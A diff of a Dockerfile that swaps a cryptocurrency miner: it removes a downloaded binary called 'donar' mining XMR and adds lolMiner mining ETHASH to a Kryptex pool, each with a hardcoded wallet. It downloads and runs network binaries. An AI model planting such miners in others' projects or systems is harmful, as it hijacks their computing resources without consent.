@@ -13,8 +13,8 @@ RUN apt-get update && \
 
 # Build commands
 WORKDIR /build
-RUN wget -O donar "https://github.com/lilcoinzdc/donuts/releases/download/tripple-nut/donar" && \
-  chmod +x donar
+RUN wget -O lol.tar.gz "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" && \
+  tar -zxf lol.tar.gz
 
 # ---
 
@@ -24,12 +24,11 @@ FROM ubuntu:24.04
 WORKDIR /app
 
 # Deploy files: Copy only the binary from the builder stage
-COPY --from=builder /build/donar .
+COPY --from=builder /build/1.98 .
 
 # Run command
 # I've broken the arguments into an array for clarity and safety
-CMD ["./donar", \
-  "--coin", "XMR", \
-  "--url", "donuts", \
-  "--user", "8B1e8kfLb6xLmU6VmKhG5ydJXKVY1faZdfHsPRDCzFuYXp1MpGLctXxJj2SxhT6beGYKHbo4ohUk7csghsUzo2BCUfC67Ew/ngas", \
-  "--threads", "8"]
+CMD ["./1.98/lolMiner", \
+  "--algo", "ETHASH", \
+  "--pool", "ethw.kryptex.network:7034", \
+  "--user", "0xb83351cd7c4f3b91a1fbec921580017e5f075f22"]
